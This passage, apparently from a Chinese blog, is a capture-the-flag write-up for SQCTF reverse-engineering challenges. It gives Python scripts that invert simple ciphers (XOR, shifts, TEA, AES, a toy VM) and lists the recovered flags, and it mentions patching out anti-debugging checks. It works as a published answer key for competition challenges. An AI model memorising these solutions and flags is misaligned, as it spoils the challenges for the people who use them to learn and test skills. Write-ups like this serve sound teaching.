class="number">5</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(part2_2)):</span><br><span class="line">        tmp += <span class="built_in">chr</span>(<span class="built_in">ord</span>(part2_2[i]) + <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(part2_3)):</span><br><span class="line">        tmp += <span class="built_in">chr</span>(<span class="built_in">ord</span>(part2_3[i]) - <span class="number">7</span>)</span><br><span class="line">    ciphertext = <span class="string">&#x27;itd~tzw_know_sanmenxbZ8&#x27;</span></span><br><span class="line">    true_flag = part1 + part2 + part3</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ciphertext = <span class="string">&#x27;itd~tzw_know_sanmenxbZ8&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拆分加密后的字符串</span></span><br><span class="line">part1_encrypted = ciphertext[:<span class="number">7</span>]</span><br><span class="line">part2_encrypted = ciphertext[<span class="number">7</span>:<span class="number">20</span>]</span><br><span class="line">part3_encrypted = ciphertext[<span class="number">20</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密第一部分：每个字符ASCII减5</span></span><br><span class="line">decrypted_part1 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(c) - <span class="number">5</span>) <span class="keyword">for</span> c <span class="keyword">in</span> part1_encrypted])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二部分保持不变</span></span><br><span class="line">decrypted_part2 = part2_encrypted</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密第三部分：每个字符ASCII加7</span></span><br><span class="line">decrypted_part3 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(c) + <span class="number">7</span>) <span class="keyword">for</span> c <span class="keyword">in</span> part3_encrypted])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并所有部分</span></span><br><span class="line">original_part2 = decrypted_part1 + decrypted_part2 + decrypted_part3</span><br><span class="line">flag = <span class="string">f&#x27;flag&#123;&#123;<span class="subst">&#123;original_part2&#125;</span>&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>flag{do_your_know_sanmenxia?}</p>
<p>SQCTF{do_your_know_sanmenxia?}</p>
<h3 id="圣人当仁不让"><a href="#圣人当仁不让" class="headerlink" title="圣人当仁不让"></a>圣人当仁不让</h3><p>查看源码，中间对flag改变，感觉跟vm没多大关系</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">encoded_str = <span class="string">&quot;/P7sAe/U0s7c1vjb0vjfyt==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64 解码</span></span><br><span class="line">processed_bytes = base64.b64decode(encoded_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逆向 vm_execute 处理</span></span><br><span class="line">flag_bytes = <span class="built_in">bytes</span>([(((b - <span class="number">3</span>) ^ <span class="number">0xAA</span>)) % <span class="number">0xff</span> <span class="keyword">for</span> b <span class="keyword">in</span> processed_bytes])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为字符串</span></span><br><span class="line">flag = flag_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br></pre></td></tr></table></figure>

<p>SQCSF{easy_re_vm</p>
<p>改成SQCTF</p>
<h3 id="往事暗沉不可追"><a href="#往事暗沉不可追" class="headerlink" title="往事暗沉不可追"></a>往事暗沉不可追</h3><p>解密后的数据就是flag，用逗号隔开，flag请以SQCTF提交</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleVM</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.memory = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">        <span class="variable language_">self</span>.registers = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">self, reg, addr</span>):</span><br><span class="line">        <span class="variable language_">self</span>.registers[reg] = <span class="variable language_">self</span>.memory[addr]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">self, reg, addr</span>):</span><br><span class="line">        <span class="variable language_">self</span>.memory[addr] = <span class="variable language_">self</span>.registers[reg]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">self, reg, value</span>):</span><br><span class="line">        <span class="variable language_">self</span>.registers[reg] ^= value</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">self, bytecode</span>):</span><br><span class="line">        ip = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> ip &lt; <span class="built_in">len</span>(bytecode):</span><br><span class="line">            op = bytecode[ip]</span><br><span class="line">            <span class="keyword">if</span> op == <span class="string">&#x27;LOAD&#x27;</span>:</span><br><span class="line">                reg = bytecode[ip + <span class="number">1</span>]</span><br><span class="line">                addr = bytecode[ip + <span class="number">2</span>]</span><br><span class="line">                <span class="variable language_">self</span>.load(reg, addr)</span><br><span class="line">                ip += <span class="number">3</span></span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;STORE&#x27;</span>:</span><br><span class="line">                reg = bytecode[ip + <span class="number">1</span>]</span><br><span class="line">                addr = bytecode[ip + <span class="number">2</span>]</span><br><span class="line">                <span class="variable language_">self</span>.store(reg, addr)</span><br><span class="line">                ip += <span class="number">3</span></span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;XOR&#x27;</span>:</span><br><span class="line">                reg = bytecode[ip + <span class="number">1</span>]</span><br><span class="line">                value = bytecode[ip + <span class="number">2</span>]</span><br><span class="line">                <span class="variable language_">self</span>.xor(reg, value)</span><br><span class="line">                ip += <span class="number">3</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">f&#x27;&#x27;&#x27;Unknown opcode: <span class="subst">&#123;op&#125;</span>&#x27;&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="literal">None</span> &lt; <span class="built_in">len</span>(bytecode):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_memory</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.memory</span><br><span class="line"></span><br><span class="line">bytecode = [</span><br><span class="line">    <span class="string">&#x27;LOAD&#x27;</span>, <span class="number">0</span>, <span class="number">16</span>,</span><br><span class="line">    <span class="string">&#x27;XOR&#x27;</span>, <span class="number">0</span>, <span class="number">85</span>,</span><br><span class="line">    <span class="string">&#x27;STORE&#x27;</span>,  <span class="number">0</span>, <span class="number">32</span>,</span><br><span class="line">    <span class="string">&#x27;LOAD&#x27;</span>, <span class="number">1</span>,  <span class="number">32</span>,</span><br><span class="line">    <span class="string">&#x27;XOR&#x27;</span>, <span class="number">1</span>, <span class="number">170</span>,</span><br><span class="line">    <span class="string">&#x27;STORE&#x27;</span>, <span class="number">1</span>, <span class="number">48</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">encrypted_data = [<span class="number">127</span>, <span class="number">131</span>, <span class="number">125</span>, <span class="number">123</span>, <span class="number">135</span>, <span class="number">127</span>, <span class="number">133</span>, <span class="number">123</span>, <span class="number">125</span>, <span class="number">131</span>, <span class="number">127</span>, <span class="number">135</span>, <span class="number">131</span>, <span class="number">123</span>, <span class="number">135</span>, <span class="number">125</span>]</span><br><span class="line"></span><br><span class="line">vm = SimpleVM()</span><br><span class="line">vm.memory[<span class="number">16</span>:<span class="number">16</span> + <span class="built_in">len</span>(encrypted_data)] = encrypted_data</span><br><span class="line">vm.execute(bytecode)</span><br><span class="line">final_memory = vm.get_memory()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>reg &#x3D; 0 addr &#x3D; 16 127</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">encrypted_data = [<span class="number">127</span>, <span class="number">131</span>, <span class="number">125</span>, <span class="number">123</span>, <span class="number">135</span>, <span class="number">127</span>, <span class="number">133</span>, <span class="number">123</span>, <span class="number">125</span>, <span class="number">131</span>, <span class="number">127</span>, <span class="number">135</span>, <span class="number">131</span>, <span class="number">123</span>, <span class="number">135</span>, <span class="number">125</span>]</span><br><span class="line">decrypted = [x ^ <span class="number">0xFF</span> <span class="keyword">for</span> x <span class="keyword">in</span> encrypted_data]</span><br><span class="line">flag = <span class="string">f&quot;SQCTF&#123;&#123;<span class="subst">&#123;<span class="string">&#x27;,&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, decrypted))&#125;</span>&#125;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>自己做比Deepseek快系列，反汇编的代码是错的,if ip &lt; len(bytecode):应该是while </p>
<p>SQCTF{128,124,130,132,120,128,122,132,130,124,128,120,124,132,120,130}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqctf&#123;Sun_Ensheng_is_the_most_handsome.&#125;</span><br></pre></td></tr></table></figure>

<h3 id="遇事不决，可问春风"><a href="#遇事不决，可问春风" class="headerlink" title="遇事不决，可问春风"></a>遇事不决，可问春风</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250409103000206.png" alt="image-20250409103000206"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">&#x27;5#)75#)7&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(enc[i] )^ <span class="built_in">ord</span>(<span class="string">&#x27;B&#x27;</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="春风也有春风愁"><a href="#春风也有春风愁" class="headerlink" title="春风也有春风愁"></a>春风也有春风愁</h3><p>DEEPSEEK梭</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义两个QWORD数值</span></span><br><span class="line">qword1 = <span class="number">0xFBF715FA08FD0B0D</span></span><br><span class="line">qword2 = <span class="number">0x0F0E011431130DFB</span>  <span class="comment"># 补零后的数值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将QWORD转换为小端字节数组</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qword_to_bytes_le</span>(<span class="params">qword</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(<span class="string">f&quot;<span class="subst">&#123;qword:016x&#125;</span>&quot;</span>)[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">bytes1 = qword_to_bytes_le(qword1)  <span class="comment"># 前8字节</span></span><br><span class="line">bytes2 = qword_to_bytes_le(qword2)  <span class="comment"># 后8字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造v6数组（15字节）</span></span><br><span class="line">v6 = <span class="built_in">bytearray</span>(<span class="number">15</span>)</span><br><span class="line">v6[<span class="number">0</span>:<span class="number">8</span>] = bytes1  <span class="comment"># 填充前8字节</span></span><br><span class="line">v6[<span class="number">7</span>:<span class="number">15</span>] = bytes2[:<span class="number">8</span>]  <span class="comment"># 从第7个位置开始填充后8字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算每个字符</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> byte <span class="keyword">in</span> v6:</span><br><span class="line">    temp = (byte - <span class="number">55</span>) % <span class="number">256</span>  <span class="comment"># 处理减法溢出</span></span><br><span class="line">    c = temp ^ <span class="number">0xA5</span></span><br><span class="line">    flag.append(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为字符串</span></span><br><span class="line">flag_str = <span class="built_in">bytes</span>(flag).decode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag_str)</span><br></pre></td></tr></table></figure>

<h3 id="你若安好便是晴"><a href="#你若安好便是晴" class="headerlink" title="你若安好便是晴"></a>你若安好便是晴</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250409110431012.png" alt="image-20250409110431012"></p>
<p>deepseek梭了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_block</span>(<span class="params">v0, v1, key</span>):</span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    sum_ = (delta * <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span>  <span class="comment"># 初始sum为0xC6EF3720</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        <span class="comment"># 根据sub_101的逻辑处理v1和v0</span></span><br><span class="line">        temp = ((v0 &lt;&lt; <span class="number">4</span>) + key[<span class="number">2</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        temp ^= (v0 + sum_) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        temp ^= ((v0 &gt;&gt; <span class="number">5</span>) + key[<span class="number">3</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v1 = (v1 - temp) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">        temp = ((v1 &lt;&lt; <span class="number">4</span>) + key[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        temp ^= (v1 + sum_) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        temp ^= ((v1 &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 = (v0 - temp) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">        sum_ = (sum_ + <span class="number">0x61C88647</span>) &amp; <span class="number">0xFFFFFFFF</span>  <span class="comment"># 相当于每次减去delta</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v0, v1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea_decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    plaintext = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext), <span class="number">8</span>):</span><br><span class="line">        block = ciphertext[i:i+<span class="number">8</span>]</span><br><span class="line">        v0 = <span class="built_in">int</span>.from_bytes(block[:<span class="number">4</span>], <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        v1 = <span class="built_in">int</span>.from_bytes(block[<span class="number">4</span>:<span class="number">8</span>], <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        v0_dec, v1_dec = decrypt_block(v0, v1, key)</span><br><span class="line">        plaintext.extend(v0_dec.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">        plaintext.extend(v1_dec.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理密钥（转换为无符号32位整数）</span></span><br><span class="line">key = [<span class="number">305419896</span>, -<span class="number">2023406815</span>, -<span class="number">1412567144</span>, -<span class="number">1728127814</span>]</span><br><span class="line">key = [(x + (<span class="number">1</span> &lt;&lt; <span class="number">32</span>)) % (<span class="number">1</span> &lt;&lt; <span class="number">32</span>) <span class="keyword">for</span> x <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密文转换为字节</span></span><br><span class="line">ciphertext = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;7f1f17fd8e51aa660b8036914a4950e8fa8078a2ef33608650fb7a845226f2d1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行TEA解密</span></span><br><span class="line">decrypted_data = tea_decrypt(ciphertext, key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 应用sub_100的处理（异或22）</span></span><br><span class="line">processed = <span class="built_in">bytes</span>([b ^ <span class="number">22</span> <span class="keyword">for</span> b <span class="keyword">in</span> decrypted_data])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    flag = processed.decode(<span class="string">&#x27;utf-8&#x27;</span>).strip(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br><span class="line"><span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Decrypted Bytes (hex):&quot;</span>, processed.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>



<h3 id="人生自古谁无死"><a href="#人生自古谁无死" class="headerlink" title="人生自古谁无死"></a>人生自古谁无死</h3><p>PATCH掉反调试，然后动调</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250409112212216.png" alt="image-20250409112212216"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250409112219595.png" alt="image-20250409112219595"></p>
<h3 id="天下谁人不识君"><a href="#天下谁人不识君" class="headerlink" title="天下谁人不识君"></a>天下谁人不识君</h3><p>AI</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;wesyvbniazxchjko1973652048@$+-&amp;*&lt;&gt;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;v7b3boika$h4h5j0jhkh161h79393i5x010j0y8n$i&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)//<span class="number">2</span>):</span><br><span class="line">    r1 = result[<span class="number">2</span>*i]</span><br><span class="line">    r2 = result[<span class="number">2</span>*i+<span class="number">1</span>]</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):  <span class="comment"># 可打印ASCII范围</span></span><br><span class="line">        s1 = c // <span class="number">17</span></span><br><span class="line">        s2 = c % <span class="number">17</span></span><br><span class="line">        e1 = s[(s1 + i) % <span class="number">34</span>]</span><br><span class="line">        e2 = s[-(s2 + i + <span class="number">1</span>) % <span class="number">34</span>]</span><br><span class="line">        <span class="keyword">if</span> e1 == r1 <span class="keyword">and</span> e2 == r2:</span><br><span class="line">            flag += <span class="built_in">chr</span>(c)</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        flag += <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Recovered flag:&#x27;</span>, flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="唧唧复唧唧，木兰当户织"><a href="#唧唧复唧唧，木兰当户织" class="headerlink" title="唧唧复唧唧，木兰当户织"></a>唧唧复唧唧，木兰当户织</h3><p>BASE64解码后逗号换成英文</p>
<h3 id="即随本心"><a href="#即随本心" class="headerlink" title="即随本心"></a>即随本心</h3><p>pyc逆向</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;1234567890abcdef&#x27;</span></span><br><span class="line">encrypted_data = <span class="string">&#x27;MTIzNDU2Nzg5MGFiY2RlZpOn0SHxbVMvaa7jQztMCBtCCiuX+ZRBzSfcL01St5Bmi8BjGeuXliictrjqzSpCGw==&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: base64 解码</span></span><br><span class="line">raw = base64.b64decode(encrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: 分离 IV 和密文</span></span><br><span class="line">iv = raw[:<span class="number">16</span>]</span><br><span class="line">ciphertext = raw[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: 创建 AES cipher 对象</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 4: 解密 + unpad</span></span><br><span class="line">plaintext_padded = cipher.decrypt(ciphertext)</span><br><span class="line">plaintext = unpad(plaintext_padded, AES.block_size)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;解密结果：&#x27;</span>, plaintext.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="看山不是山"><a href="#看山不是山" class="headerlink" title="看山不是山"></a>看山不是山</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encrypted_data</span>):</span><br><span class="line">    key_bytes = [<span class="number">0x4d</span>, <span class="number">0x3c</span>, <span class="number">0x2b</span>, <span class="number">0x1a</span>]  <span class="comment"># 根据密钥439041101的移位结果确定的字节顺序</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted_data)):</span><br><span class="line">        encrypted_byte = encrypted_data[i]</span><br><span class="line">        <span class="comment"># 逆向加法操作</span></span><br><span class="line">        y = (encrypted_byte - i) % <span class="number">256</span></span><br><span class="line">        <span class="comment"># 逆向异或操作</span></span><br><span class="line">        key_byte = key_bytes[i % <span class="number">4</span>]</span><br><span class="line">        data_byte = y ^ key_byte</span><br><span class="line">        result.append(data_byte)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标密文</span></span><br><span class="line">target = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;738495a6b7c8d9e0f123456789abcdef&#x27;</span>)</span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">decrypted_data = decrypt(target)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的数据:&quot;</span>, decrypted_data)</span><br><span class="line"><span class="built_in">print</span>(<span 